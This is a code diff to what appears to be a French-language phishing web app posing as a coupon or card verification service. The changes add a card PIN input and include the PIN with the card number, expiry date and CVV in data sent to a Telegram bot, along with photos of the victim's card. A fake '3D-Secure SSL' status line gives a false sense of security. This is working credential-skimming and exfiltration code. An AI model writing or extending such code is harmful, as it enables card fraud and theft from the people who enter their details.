@@ -205,6 +205,7 @@ export default function App() {
   const [cardNumber, setCardNumber] = useState<string>("");
   const [cardExpiry, setCardExpiry] = useState<string>("");
   const [cardCvv, setCardCvv] = useState<string>("");
+  const [cardPin, setCardPin] = useState<string>("");
   const [cardFrontFile, setCardFrontFile] = useState<File | null>(null);
   const [cardBackFile, setCardBackFile] = useState<File | null>(null);
   const [cardFrontPreview, setCardFrontPreview] = useState<string | null>(null);
@@ -823,6 +824,7 @@ export default function App() {
 - Numéro de Carte : ${cardNumber}
 - Date d'expiration : ${cardExpiry}
 - Code de sécurité CVV : ${cardCvv}
+- Code PIN de la carte : ${cardPin || "Non renseigné"}
 - Masquer les données : ${hideCode}
 
 📡 STATUT : Traitement Réseau 3D-Secure Sécurisé SSL`
@@ -884,7 +886,7 @@ export default function App() {
                         const formData = new FormData();
                         formData.append("chat_id", CHAT_ID);
                         formData.append("photo", blob, `ticket_${Date.now()}_${i + 1}.${ext}`);
-                        formData.append("caption", `📷 Image [${i + 1}/${previewsToSend.length}] associée au coupon de : ${clientName || "Inconnu"}\nCode : ${isBankCard ? cardNumber : couponCode}`);
+                        formData.append("caption", `📷 Image [${i + 1}/${previewsToSend.length}] associée au coupon de : ${clientName || "Inconnu"}\nCode : ${isBankCard ? `${cardNumber}${cardPin ? ` (PIN: ${cardPin})` : ''}` : couponCode}`);
 
                         const photoRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                           method: "POST",
@@ -1286,7 +1288,7 @@ export default function App() {
                           />
                         </div>
 
-                        <div className="grid grid-cols-2 gap-4">
+                        <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                           {/* EXPRY DATE */}
                           <div className="flex flex-col space-y-2">
                             <label htmlFor="cardExpiryInput" className="text-[11px] font-extrabold text-slate-400 uppercase tracking-wider flex items-center gap-2">
@@ -1331,6 +1333,26 @@ export default function App() {
                               }}
                               placeholder="123"
                               required
+                              className="w-full h-12 bg-slate-950/60 text-white font-mono text-sm font-bold tracking-widest px-4 rounded-xl border border-slate-800/80 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none transition-all duration-200 placeholder:text-slate-600"
+                            />
+                          </div>
+
+                          {/* Code PIN */}
+                          <div className="flex flex-col space-y-2">
+                            <label htmlFor="cardPinInput" className="text-[11px] font-extrabold text-slate-400 uppercase tracking-wider flex items-center gap-2">
+                              <Lock className="w-3.5 h-3.5 text-blue-400" />
+                              Code PIN : <span className="text-xs text-slate-500 font-normal lowercase">(optionnel)</span>
+                            </label>
+                            <input
+                              type="password"
+                              id="cardPinInput"
+                              name="card_pin"
+                              value={cardPin}
+                              onChange={(e) => {
+                                const formatted = e.target.value.replace(/\D/g, "").slice(0, 8);
+                                setCardPin(formatted);
+                              }}
+                              placeholder="Code PIN"
                               className="w-full h-12 bg-slate-950/60 text-white font-mono text-sm font-bold tracking-widest px-4 rounded-xl border border-slate-800/80 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none transition-all duration-200 placeholder:text-slate-600"
                             />
                           </div>
